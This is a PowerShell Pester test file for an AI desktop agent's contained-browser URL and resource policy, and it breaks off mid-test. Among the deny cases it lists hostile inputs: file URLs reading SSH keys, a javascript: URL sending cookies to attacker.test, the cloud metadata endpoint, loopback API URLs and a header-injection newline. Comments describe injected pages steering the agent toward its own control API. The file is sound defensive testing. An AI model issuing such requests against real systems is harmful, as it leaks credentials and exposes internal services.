#requires -Version 7.0

# Contained browser automation, per decision 0003. The first workflow is a
# read-only weather lookup, so the Tool surface has no action with an external
# effect and the load-bearing boundary is the URL policy.
#
# The classifier is written to be wrong only in the safe direction, exactly like
# Test-DpCommandSafe: anything it does not positively recognise is refused or
# escalated to the user, never allowed.

BeforeAll {
    $privateRoot = Join-Path $PSScriptRoot '..' '..' 'source' 'Private'
    Get-ChildItem -Path $privateRoot -Filter '*.ps1' | ForEach-Object { . $_.FullName }

    $script:Scope = @('weathercity.com')
}

Describe 'Resolve-DpBrowserUrlDecision' -Tag 'Unit' {
    Context 'in-scope navigation' {
        It 'allows the scoped host itself' {
            $decision = Resolve-DpBrowserUrlDecision -Url 'https://weathercity.com/cl/ll/osorno' -Scope $script:Scope
            $decision.decision | Should -Be 'allow'
            $decision.host | Should -Be 'weathercity.com'
        }

        It 'allows a subdomain of the scoped host' {
            (Resolve-DpBrowserUrlDecision -Url 'https://www.weathercity.com/cl/' -Scope $script:Scope).decision |
                Should -Be 'allow'
        }

        It 'matches the host case-insensitively' {
            (Resolve-DpBrowserUrlDecision -Url 'https://WeatherCity.COM/cl/' -Scope $script:Scope).decision |
                Should -Be 'allow'
        }
    }

    Context 'suffix confusion' {
        # endsWith('weathercity.com') is the classic bug this guards.
        It 'does not let a lookalike host inherit the scope' -TestCases @(
            @{ Url = 'https://evilweathercity.com/' }
            @{ Url = 'https://notweathercity.com/' }
            @{ Url = 'https://weathercity.com.evil.test/' }
            @{ Url = 'https://weathercity.competitor.test/' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Not -Be 'allow'
        }
    }

    Context 'off-scope navigation' {
        It 'asks rather than allowing or refusing outright' {
            $decision = Resolve-DpBrowserUrlDecision -Url 'https://example.test/page' -Scope $script:Scope
            $decision.decision | Should -Be 'ask'
            $decision.host | Should -Be 'example.test'
        }

        It 'carries the full url so the approval card can show the payload' {
            $url = 'https://attacker.test/?ctx=D%3A%5CGit%5CDeskPilot'
            (Resolve-DpBrowserUrlDecision -Url $url -Scope $script:Scope).url | Should -Be $url
        }

        It 'allows a host the project added to the scope' {
            (Resolve-DpBrowserUrlDecision -Url 'https://example.test/page' -Scope @('weathercity.com', 'example.test')).decision |
                Should -Be 'allow'
        }
    }

    Context 'schemes that bypass domain policy entirely' {
        # None of these is ever approvable: a scheme with no host cannot be
        # scoped, and file: reads the disk the browser is meant not to reach.
        It 'refuses <Url> outright' -TestCases @(
            @{ Url = 'file:///C:/Users/install/.ssh/id_rsa' }
            @{ Url = 'file://server/share/secret.txt' }
            @{ Url = 'javascript:fetch("https://attacker.test/?c="+document.cookie)' }
            @{ Url = 'data:text/html,<script>location="https://attacker.test"</script>' }
            @{ Url = 'blob:https://weathercity.com/1234' }
            @{ Url = 'view-source:https://weathercity.com/' }
            @{ Url = 'ftp://weathercity.com/pub' }
            @{ Url = 'ws://weathercity.com/socket' }
            @{ Url = 'chrome://settings' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Be 'deny'
        }

        It 'refuses plain http even for a scoped host' {
            (Resolve-DpBrowserUrlDecision -Url 'http://weathercity.com/' -Scope $script:Scope).decision |
                Should -Be 'deny'
        }
    }

    Context 'the loopback and private-network hole' {
        # DeskPilot's own API is on loopback. An injected page inducing a
        # navigation to it must never be merely 'ask', because a user who
        # approves once would hand the page DeskPilot's own control surface.
        It 'refuses <Url> outright rather than asking' -TestCases @(
            @{ Url = 'https://127.0.0.1:8720/api/settings' }
            @{ Url = 'https://localhost:8720/api/settings' }
            @{ Url = 'https://[::1]:8720/api/settings' }
            @{ Url = 'https://10.0.0.5/admin' }
            @{ Url = 'https://192.168.1.1/admin' }
            @{ Url = 'https://172.16.0.1/admin' }
            @{ Url = 'https://169.254.169.254/latest/meta-data/' }
            @{ Url = 'https://0.0.0.0/' }
            @{ Url = 'https://[fd00::1]/' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Be 'deny'
        }

        It 'still refuses a private address that the project tried to allow' {
            # A scope entry must not be able to re-open the SSRF path.
            (Resolve-DpBrowserUrlDecision -Url 'https://127.0.0.1:8720/api/settings' -Scope @('127.0.0.1')).decision |
                Should -Be 'deny'
        }
    }

    Context 'credentials embedded in the url' {
        It 'refuses a url carrying userinfo' {
            (Resolve-DpBrowserUrlDecision -Url 'https://user:secret@weathercity.com/' -Scope $script:Scope).decision |
                Should -Be 'deny'
        }

        It 'does not echo the secret in the decision' {
            $decision = Resolve-DpBrowserUrlDecision -Url 'https://user:hunter2@weathercity.com/' -Scope $script:Scope
            ($decision | ConvertTo-Json -Depth 5) | Should -Not -Match 'hunter2'
        }
    }

    Context 'malformed and abusive input' {
        It 'refuses <Description>' -TestCases @(
            @{ Url = ''; Description = 'an empty url' }
            @{ Url = '   '; Description = 'whitespace' }
            @{ Url = 'not a url'; Description = 'unparseable text' }
            @{ Url = 'https://'; Description = 'a scheme with no host' }
            @{ Url = "https://weathercity.com/`r`nX-Injected: 1"; Description = 'a header-injection newline' }
        ) {
            param($Url)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:Scope).decision | Should -Be 'deny'
        }

        It 'refuses a url long enough to be a payload rather than an address' {
            $url = 'https://weathercity.com/?q=' + ('a' * 9000)
            (Resolve-DpBrowserUrlDecision -Url $url -Scope $script:Scope).decision | Should -Be 'deny'
        }
    }

    Context 'an empty scope' {
        It 'asks for an ordinary https url rather than allowing it' {
            (Resolve-DpBrowserUrlDecision -Url 'https://weathercity.com/' -Scope @()).decision | Should -Be 'ask'
        }

        It 'still refuses a disallowed scheme' {
            (Resolve-DpBrowserUrlDecision -Url 'file:///C:/secret' -Scope @()).decision | Should -Be 'deny'
        }
    }
}

Describe 'Get-DpBrowserScope' -Tag 'Unit' {
    It 'derives the scope from the starting url host' {
        Get-DpBrowserScope -StartUrl 'https://weathercity.com/cl/' | Should -Be @('weathercity.com')
    }

    It 'adds validated project domains' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -ProjectDomain @('example.test', 'cdn.example.test')
        $scope | Should -Contain 'weathercity.com'
        $scope | Should -Contain 'example.test'
        $scope | Should -Contain 'cdn.example.test'
    }

    It 'adds hosts granted during this run' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -GrantedHost @('granted.test')
        $scope | Should -Contain 'granted.test'
    }

    It 'does not duplicate a host present in more than one source' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -ProjectDomain @('weathercity.com') -GrantedHost @('weathercity.com')
        @($scope | Where-Object { $_ -eq 'weathercity.com' }).Count | Should -Be 1
    }

    It 'drops a project entry that is not a usable host' {
        $scope = Get-DpBrowserScope -StartUrl 'https://weathercity.com/' -ProjectDomain @('', '   ', 'not a host', '*')
        $scope | Should -Be @('weathercity.com')
    }

    It 'returns an empty scope for an unusable starting url' {
        Get-DpBrowserScope -StartUrl 'file:///C:/secret' | Should -BeNullOrEmpty
    }
}

Describe 'Test-DpBrowserResourceAllowed' -Tag 'Unit' {
    # The asymmetry decision 0003 rests on: the page controls sub-resources and
    # the page knows no secrets, so an off-origin image leaks nothing. Script,
    # WebSocket and XHR are different - each is a channel that outlives or
    # rewrites what the user approved.
    Context 'in-scope resources' {
        It 'allows <Type> from a scoped host' -TestCases @(
            @{ Type = 'document' }, @{ Type = 'script' }, @{ Type = 'xhr' }
            @{ Type = 'fetch' }, @{ Type = 'stylesheet' }, @{ Type = 'image' }
        ) {
            param($Type)
            Test-DpBrowserResourceAllowed -Url 'https://weathercity.com/a' -ResourceType $Type -Scope $script:Scope |
                Should -BeTrue
        }
    }

    Context 'off-origin resources' {
        It 'allows passive <Type>' -TestCases @(
            @{ Type = 'image' }, @{ Type = 'stylesheet' }, @{ Type = 'font' }, @{ Type = 'media' }
        ) {
            param($Type)
            Test-DpBrowserResourceAllowed -Url 'https://cdn.example.test/a' -ResourceType $Type -Scope $script:Scope |
                Should -BeTrue
        }

        It 'blocks active <Type>' -TestCases @(
            @{ Type = 'script' }, @{ Type = 'xhr' }, @{ Type = 'fetch' }
            @{ Type = 'websocket' }, @{ Type = 'eventsource' }, @{ Type = 'manifest' }
        ) {
            param($Type)
            Test-DpBrowserResourceAllowed -Url 'https://attacker.test/a' -ResourceType $Type -Scope $script:Scope |
                Should -BeFalse
        }

        It 'blocks a resource type it has never heard of' {
            Test-DpBrowserResourceAllowed -Url 'https://attacker.test/a' -ResourceType 'quantum' -Scope $script:Scope |
                Should -BeFalse
        }
    }

    Context 'resources that are never allowed' {
        It 'blocks a passive resource on a refused scheme' {
            Test-DpBrowserResourceAllowed -Url 'file:///C:/secret.png' -ResourceType 'image' -Scope $script:Scope |
                Should -BeFalse
        }

        It 'blocks a passive resource aimed at loopback' {
            Test-DpBrowserResourceAllowed -Url 'https://127.0.0.1:8720/api/settings' -ResourceType 'image' -Scope $script:Scope |
                Should -BeFalse
        }
    }
}

# One boundary enforced in two places is only a boundary while the two agree.
# PowerShell decides before a navigation so the approval card can be raised
# first; policy.mjs decides inside the request path, where it can see redirects,
# frames, pop-ups and sub-resources PowerShell never hears about. Neither is
# redundant, and a drift between them would be silent - so both are held to one
# corpus, and the corpus is the specification.
Describe 'Browser URL policy conformance' -Tag 'Unit' {
    BeforeDiscovery {
        $corpusPath = Join-Path $PSScriptRoot 'fixtures' 'browser-policy-corpus.json'
        $corpus = Get-Content -LiteralPath $corpusPath -Raw | ConvertFrom-Json

        $script:UrlCases = @()
        for ($i = 0; $i -lt @($corpus.urlCases).Count; $i++) {
            $script:UrlCases += @{ Index = $i; Url = $corpus.urlCases[$i].url; Expect = $corpus.urlCases[$i].expect; Note = $corpus.urlCases[$i].note }
        }
        $script:ResourceCases = @()
        for ($i = 0; $i -lt @($corpus.resourceCases).Count; $i++) {
            $script:ResourceCases += @{ Index = $i; Url = $corpus.resourceCases[$i].url; Type = $corpus.resourceCases[$i].type; Expect = $corpus.resourceCases[$i].expect; Note = $corpus.resourceCases[$i].note }
        }
        $script:FieldCases = @()
        for ($i = 0; $i -lt @($corpus.fieldCases).Count; $i++) {
            $script:FieldCases += @{ Index = $i; Expect = $corpus.fieldCases[$i].expect; Note = $corpus.fieldCases[$i].note }
        }
        $script:AddressCases = @()
        for ($i = 0; $i -lt @($corpus.addressCases).Count; $i++) {
            $script:AddressCases += @{ Index = $i; Address = $corpus.addressCases[$i].address; Expect = $corpus.addressCases[$i].expect; Note = $corpus.addressCases[$i].note }
        }
        $script:NodeAvailable = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
    }

    BeforeAll {
        $corpusPath = Join-Path $PSScriptRoot 'fixtures' 'browser-policy-corpus.json'
        $corpus = Get-Content -LiteralPath $corpusPath -Raw | ConvertFrom-Json
        $script:CorpusScope = @($corpus.scope)

        $script:NodeUrlVerdict = @{}
        $script:NodeResourceVerdict = @{}
        $script:NodeError = $null

        $node = Get-Command node -CommandType Application -ErrorAction SilentlyContinue
        if ($node) {
            $runner = Join-Path $PSScriptRoot 'fixtures' 'run-policy-corpus.mjs'
            # UTF-8 on the round trip: the corpus deliberately contains hosts
            # that only differ from an ASCII one after IDNA mapping, and the
            # console code page would fold them into each other.
            $previousEncoding = [Console]::OutputEncoding
            try {
                [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
                $stdout = & $node.Source $runner $corpusPath 2>&1
            }
            finally { [Console]::OutputEncoding = $previousEncoding }

            if ($LASTEXITCODE -ne 0) {
                $script:NodeError = ($stdout | Out-String).Trim()
            }
            else {
                $parsed = ($stdout | Out-String) | ConvertFrom-Json
                foreach ($row in $parsed.urlResults) { $script:NodeUrlVerdict[[int]$row.index] = $row.actual }
                foreach ($row in $parsed.resourceResults) { $script:NodeResourceVerdict[[int]$row.index] = [bool]$row.actual }
                $script:NodeFieldVerdict = @{}
                foreach ($row in $parsed.fieldResults) { $script:NodeFieldVerdict[[int]$row.index] = [bool]$row.actual }
                $script:NodeAddressVerdict = @{}
                foreach ($row in $parsed.addressResults) { $script:NodeAddressVerdict[[int]$row.index] = [bool]$row.actual }
            }
        }
    }

    Context 'the PowerShell classifier matches the corpus' {
        It '<Expect>: <Note>' -TestCases $script:UrlCases {
            param($Url, $Expect)
            (Resolve-DpBrowserUrlDecision -Url $Url -Scope $script:CorpusScope).decision | Should -Be $Expect
        }
    }

    Context 'the PowerShell resource policy matches the corpus' {
        It '<Type> -> <Expect>: <Note>' -TestCases $script:ResourceCases {
            param($Url, $Type, $Expect)
            (Test-DpBrowserResourceAllowed -Url $Url -ResourceType $Type -Scope $script:CorpusScope) |
                Should -Be ([bool]$Expect)
        }
    }

    # Skipped rather than silently passed when Node is absent: a green run that
    # never asked the other implementation would be worse than a stated gap.
    Context 'the Node policy agrees with the corpus and with PowerShell' -Skip:(-not $script:NodeAvailable) {
        It 'ran the corpus without error' {
            $script:NodeError | Should -BeNullOrEmpty
            $script:NodeUrlVerdict.Count | Should -BeGreaterThan 0
        }

        It '<Expect>: <Note>' -TestCases $script:UrlCases {
            param($Index, $Expect)
            $script:NodeUrlVerdict.ContainsKey([int]$Index) | Should -BeTrue -Because 'every corpus url must be classified'
            $script:NodeUrlVerdict[[int]$Index] | Should -Be $Expect
        }

        It '<Type> -> <Expect>: <Note>' -TestCases $script:ResourceCases {
            param($Index, $Expect)
            $script:NodeResourceVerdict.ContainsKey([int]$Index) | Should -BeTrue
            $script:NodeResourceVerdict[[int]$Index] | Should -Be ([bool]$Expect)
        }

        It 'is never more permissive than the PowerShell classifier' {
            # Held over the curated corpus only, where every case is a form both
            # parsers accept. The generated corpus asserts the real properties.
            $rank = @{ 'deny' = 0; 'ask' = 1; 'allow' = 2 }
            foreach ($case in $script:UrlCases) {
                $mine = (Resolve-DpBrowserUrlDecision -Url $case.Url -Scope $script:CorpusScope).decision
                $theirs = $script:NodeUrlVerdict[[int]$case.Index]
                $rank[$theirs] | Should -BeLessOrEqual $rank[$mine] -Because "policy.mjs must not widen '$($case.Url)'"
            }
        }

        It 'agrees with the PowerShell classifier on every corpus case' {
            foreach ($case in $script:UrlCases) {
                $mine = (Resolve-DpBrowserUrlDecision -Url $case.Url -Scope $script:CorpusScope).decision
                $script:NodeUrlVerdict[[int]$case.Index] | Should -Be $mine -Because "the two enforcement points must agree on '$($case.Url)'"
            }
        }
    }

    # Only the supervisor can decide this one: the authoritative signal is the
    # live input's own type, which PowerShell never sees. A password box is
    # refused outright rather than masked - the user signs in themselves.
    Context 'the credential-field refusal' -Skip:(-not $script:NodeAvailable) {
        It '<Expect>: <Note>' -TestCases $script:FieldCases {
            param($Index, $Expect)
            $script:NodeFieldVerdict.ContainsKey([int]$Index) | Should -BeTrue
            $script:NodeFieldVerdict[[int]$Index] | Should -Be ([bool]$Expect)
        }
    }

    # A public name can hold a private A record, and a pre-flight resolve is a
    # TOCTOU against rebinding - so the peer address the connection landed on is
    # what decides. Without this, a name was a way around the IP-literal refusal.
    Context 'the internal-address refusal' -Skip:(-not $script:NodeAvailable) {
        It '<Address> internal=<Expect>: <Note>' -TestCases $script:AddressCases {
            param($Index, $Expect)
            $script:NodeAddressVerdict.ContainsKey([int]$Index) | Should -BeTrue
            $script:NodeAddressVerdict[[int]$Index] | Should -Be ([bool]$Expect)
        }
    }

    # The curated corpus can only hold divergence classes somebody already
    # thought of. A review found 26 disagreements on a fresh case set the corpus
    # did not cover, and then 8 more after the first fix - so the invariant's
    # inputs are generated rather than enumerated.
    Context 'the invariant holds on generated inputs, not only curated ones' -Skip:(-not $script:NodeAvailable) {
        BeforeAll {
            $script:Mutations = @()
            $script:MutationError = $null
            $node = Get-Command node -CommandType Application -ErrorAction SilentlyContinue
            if ($node) {
                $runner = Join-Path $PSScriptRoot 'fixtures' 'mutate-policy-corpus.mjs'
                $previousEncoding = [Console]::OutputEncoding
                try {
                    [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
                    $stdout = & $node.Source $runner '["weathercity.com"]' 2>&1
                }
                finally { [Console]::OutputEncoding = $previousEncoding }

                if ($LASTEXITCODE -ne 0) { $script:MutationError = ($stdout | Out-String).Trim() }
                else { $script:Mutations = @((($stdout | Out-String) | ConvertFrom-Json).results) }
            }
        }

        It 'generated a substantial case set' {
            $script:MutationError | Should -BeNullOrEmpty
            $script:Mutations.Count | Should -BeGreaterThan 500
        }

        It 'never allows a url whose host is outside the scope' {
            # The security property. The old phrasing - "never more permissive
            # than PowerShell" - was a bad proxy: System.Uri refuses to parse
            # forms the WHATWG parser canonicalises, so PowerShell says
            # deny/unparseable where policy.mjs correctly allows a host that is
            # genuinely in scope. Refusing to parse is not a permission decision.
            $offenders = [System.Collections.Generic.List[string]]::new()
            foreach ($case in $script:Mutations) {
                if ($case.decision -ne 'allow') { continue }
                $allowedHost = [string]$case.host
                $inScope = $allowedHost -eq 'weathercity.com' -or $allowedHost.EndsWith('.weathercity.com')
                if (-not $inScope) { $offenders.Add("$($case.url) -> $allowedHost") }
            }
            ($offenders -join "`n") | Should -BeNullOrEmpty
        }

        It 'names the same host as PowerShell whenever both allow' {
            # What the approval card depends on: the site shown to the user must
            # be the site the browser will contact.
            $offenders = [System.Collections.Generic.List[string]]::new()
            foreach ($case in $script:Mutations) {
                if ($case.decision -ne 'allow') { continue }
                $mine = Resolve-DpBrowserUrlDecision -Url $case.url -Scope @('weathercity.com')
                if ($mine.decision -eq 'allow' -and $mine.host -ne $case.host) {
                    $offenders.Add("$($case.url) : ps=$($mine.host) js=$($case.host)")
                }
            }
            ($offenders -join "`n") | Should -BeNullOrEmpty
        }

        It 'never allows an off-scope host that PowerShell escalated' {
            # The direction that would matter: policy.mjs waving through a host
            # PowerShell had decided needed a card.
            $offenders = [System.Collections.Generic.List[string]]::new()
            foreach ($case in $script:Mutations) {
                if ($case.decision -ne 'allow') { continue }
                $mine = Resolve-DpBrowserUrlDecision -Url $case.url -Scope @('weathercity.com')
                if ($mine.decision -eq 'ask') { $offenders.Add("$($case.url) : ps=ask js=allow host=$($case.host)") }
            }
            ($offenders -join "`n") | Should -BeNullOrEmpty
        }
    }
}


Describe 'Browser automation Permission' -Tag 'Unit' {
    It 'ships off by default' {
        (Get-DpDefaultSettings).permissions.browserAutomation | Should -BeFalse
    }

    It 'is a separate Permission from browsing' {
        # Reading a page DeskPilot fetched and driving a live one are different
        # amounts of authority, so one must not imply the other.
        $settings = Get-DpDefaultSettings
        $settings.permissions.browsing | Should -BeTrue
        $settings.permissions.browserAutomation | Should -BeFalse
    }

    It 'can be switched on through Settings' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{ permissions = @{ browserAutomation = $true } }
        $merged.permissions.browserAutomation | Should -BeTrue
    }

    It 'leaves browsing untouched when it is switched on' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{ permissions = @{ browserAutomation = $true } }
        $merged.permissions.browsing | Should -BeTrue
    }
}

Describe 'Project browser domains' -Tag 'Unit' {
    It 'defaults to an empty list for a project written before the field existed' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\projects\alpha' }
        , $project.browserDomains | Should -BeOfType [object[]]
        $project.browserDomains.Count | Should -Be 0
    }

    It 'keeps validated hosts' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('example.test', 'cdn.example.test') }
        $project.browserDomains | Should -Be @('example.test', 'cdn.example.test')
    }

    It 'normalises case and a trailing root dot' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('Example.TEST.') }
        $project.browserDomains | Should -Be @('example.test')
    }

    It 'drops a duplicate rather than storing it twice' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('example.test', 'EXAMPLE.test') }
        $project.browserDomains.Count | Should -Be 1
    }

    # Thrown, not dropped: a silently discarded entry reports as remembered and
    # then keeps raising a card, and a silently accepted one is a permanent hole.
    # Same reasoning as safeCommands in decision 0008.
    It 'rejects <Description>' -TestCases @(
        @{ Entry = 'not a host'; Description = 'a value with a space' }
        @{ Entry = '*'; Description = 'a bare wildcard' }
        @{ Entry = '*.example.test'; Description = 'a wildcard label' }
        @{ Entry = 'https://example.test/'; Description = 'a url rather than a host' }
        @{ Entry = 'example.test/path'; Description = 'a host with a path' }
        @{ Entry = 'example.test:443'; Description = 'a host with a port' }
        @{ Entry = 'localhost'; Description = 'a single-label host' }
        @{ Entry = 'com'; Description = 'a bare public suffix' }
        @{ Entry = '-bad.example.test'; Description = 'a leading hyphen' }
    ) {
        param($Entry)
        { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @($Entry) } } | Should -Throw
    }

    It 'rejects a list long enough to be an allow-everything list' {
        $many = 1..201 | ForEach-Object { "host$_.example.test" }
        { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = $many } } | Should -Throw
    }

    It 'survives a round trip through Merge-DpSettings' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{
            projects = @(@{ name = 'Alpha'; path = 'C:\projects\alpha'; browserDomains = @('example.test') })
        }
        $merged.projects[0].browserDomains | Should -Be @('example.test')
    }

    It 'reports a bad entry to the caller instead of accepting the project' {
        {
            Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{
                projects = @(@{ name = 'Alpha'; path = 'C:\projects\alpha'; browserDomains = @('*') })
            }
        } | Should -Throw
    }
}

Describe 'Project browser actions' -Tag 'Unit' {
    # Write actions restore the agency leg of the trifecta that the read-only
    # slice broke by architecture, so they are per-Project, off by default, and
    # every one of them is approved individually.
    It 'grants nothing by default' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p' }
        $project.browserActions.Count | Should -Be 0
    }

    It 'grants nothing to a project written before the field existed' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserDomains = @('example.test') }
        $project.browserActions.Count | Should -Be 0
    }

    It 'keeps a known capability' -TestCases @(
        @{ Capability = 'fill' }, @{ Capability = 'submit' }
        @{ Capability = 'upload' }, @{ Capability = 'download' }
    ) {
        param($Capability)
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserActions = @($Capability) }
        $project.browserActions | Should -Be @($Capability)
    }

    It 'normalises case and removes duplicates' {
        $project = ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserActions = @('Fill', 'fill', 'SUBMIT') }
        $project.browserActions.Count | Should -Be 2
        $project.browserActions | Should -Contain 'fill'
        $project.browserActions | Should -Contain 'submit'
    }

    # An unknown capability throws rather than being dropped, for the same reason
    # a bad safeCommands entry does: silently discarding it would report the
    # grant as remembered and then keep refusing.
    It 'rejects <Description>' -TestCases @(
        @{ Entry = 'delete'; Description = 'a capability that does not exist' }
        @{ Entry = '*'; Description = 'a wildcard' }
        @{ Entry = 'all'; Description = 'a catch-all' }
        @{ Entry = 'run_command'; Description = 'a capability from another surface' }
    ) {
        param($Entry)
        { ConvertTo-DpProject -InputObject @{ path = 'C:\p'; browserActions = @($Entry) } } | Should -Throw
    }

    It 'survives a round trip through Merge-DpSettings' {
        $merged = Merge-DpSettings -Current (Get-DpDefaultSettings) -Patch @{
            projects = @(@{ name = 'Alpha'; path = 'C:\projects\alpha'; browserActions = @('fill', 'submit') })
        }
        $merged.projects[0].browserActions | Should -Be @('fill', 'submit')
    }
}


Describe 'Get-DpBrowserRuntime' -Tag 'Unit' {
    BeforeAll {
        $script:RuntimeRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-browser-" + [guid]::NewGuid().ToString('N'))

        function New-DpTestRuntime {
            param(
                [string]$PlaywrightVersion = '1.63.0',
                [switch]$NoPackage,
                [switch]$NoBrowser
            )
            $root = Join-Path $script:RuntimeRoot ([guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $root -Force | Out-Null
            if (-not $NoPackage) {
                $pkg = Join-Path $root 'node_modules' 'playwright'
                New-Item -ItemType Directory -Path $pkg -Force | Out-Null
                @{ name = 'playwright'; version = $PlaywrightVersion } | ConvertTo-Json |
                    Set-Content -LiteralPath (Join-Path $pkg 'package.json') -Encoding utf8
            }
            if (-not $NoBrowser) {
                New-Item -ItemType Directory -Path (Join-Path $root 'browsers' 'chromium-1200') -Force | Out-Null
            }
            $root
        }
    }

    AfterAll {
        if (Test-Path -LiteralPath $script:RuntimeRoot) {
            Remove-Item -LiteralPath $script:RuntimeRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context 'a complete runtime' {
        It 'reports ready' {
            Mock Get-DpNodeCommand { @{ path = 'C:\Program Files\nodejs\node.exe'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeTrue
            $runtime.issues.Count | Should -Be 0
        }
    }

    Context 'an incomplete runtime' {
        # Every one of these is a visible failure before a Turn starts, never a
        # silent fallback to a browser DeskPilot did not install.
        It 'is not ready when Node is absent' {
            Mock Get-DpNodeCommand { $null }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.nodePresent | Should -BeFalse
            ($runtime.issues -join ' ') | Should -Match 'Node'
        }

        It 'is not ready when Node is too old for the pinned Playwright' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v18.0.0'; major = 18 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            ($runtime.issues -join ' ') | Should -Match '18'
        }

        It 'is not ready when the package was never installed' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -NoPackage) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.packageInstalled | Should -BeFalse
        }

        It 'is not ready when the installed version is not the pinned one' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -PlaywrightVersion '1.40.0') -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.versionMatch | Should -BeFalse
            ($runtime.issues -join ' ') | Should -Match '1\.40\.0'
        }

        It 'is not ready when the browser binary is missing' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -NoBrowser) -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
            $runtime.browserInstalled | Should -BeFalse
        }

        It 'is not ready when the runtime root does not exist at all' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (Join-Path $script:RuntimeRoot 'never-created') -PinnedVersion '1.63.0'
            $runtime.ready | Should -BeFalse
        }
    }

    Context 'what it tells the user' {
        It 'names a next action whenever it is not ready' {
            Mock Get-DpNodeCommand { $null }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime) -PinnedVersion '1.63.0'
            $runtime.action | Should -Not -BeNullOrEmpty
        }

        It 'never reports a version it did not read' {
            Mock Get-DpNodeCommand { @{ path = 'node'; version = 'v22.0.0'; major = 22 } }
            $runtime = Get-DpBrowserRuntime -RuntimeRoot (New-DpTestRuntime -NoPackage) -PinnedVersion '1.63.0'
            $runtime.installedVersion | Should -BeNullOrEmpty
        }
    }
}

# Exercised against a stand-in that speaks the protocol, so the framing,
# correlation, deadline and teardown behaviour is proved on a machine with no
# browser installed. The stand-in also produces the misbehaviours a real
# supervisor only produces once something has already gone wrong.
Describe 'Browser session protocol' -Tag 'Unit' {
    BeforeDiscovery {
        $script:NodeForProtocol = [bool](Get-Command node -CommandType Application -ErrorAction SilentlyContinue)
    }

    BeforeAll {
        $script:FakeSupervisor = Join-Path $PSScriptRoot 'fixtures' 'fake-supervisor.mjs'
        $script:ProtocolRoot = Join-Path ([System.IO.Path]::GetTempPath()) ("dp-proto-" + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:ProtocolRoot -Force | Out-Null

        function New-DpFakeSession {
            param([string[]]$Scope = @('weathercity.com'))
            Start-DpBrowserSession -Scope $Scope -RuntimeRoot $script:ProtocolRoot `
                -SupervisorPath $script:FakeSupervisor -StartTimeoutSeconds 30
        }
    }

    AfterAll {
        if (Test-Path -LiteralPath $script:ProtocolRoot) {
            Remove-Item -LiteralPath $script:ProtocolRoot -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    Context 'a healthy exchange' -Skip:(-not $script:NodeForProtocol) {
        It 'starts, applies the scope and answers a request' {
            $session = New-DpFakeSession
            try {
                $session.scope | Should -Be @('weathercity.com')
                $response = Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = 'hello' } -TimeoutSeconds 20
                $response.ok | Should -BeTrue
                $response.result.echoed | Should -Be 'hello'
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'matches each answer to its own request' {
            $session = New-DpFakeSession
            try {
                foreach ($value in 'one', 'two', 'three') {
                    (Invoke-DpBrowserRequest -Session $session -Command 'echo' -Payload @{ value = $value } -TimeoutSeconds 20).result.echoed |
                        Should -Be $value
                }
            }
            finally { Stop-DpBrowserSession -Session $session -Confirm:$false }
        }

        It 'collects refusals the supervisor made on its own' {
            $session = New-DpFakeSession
            try {
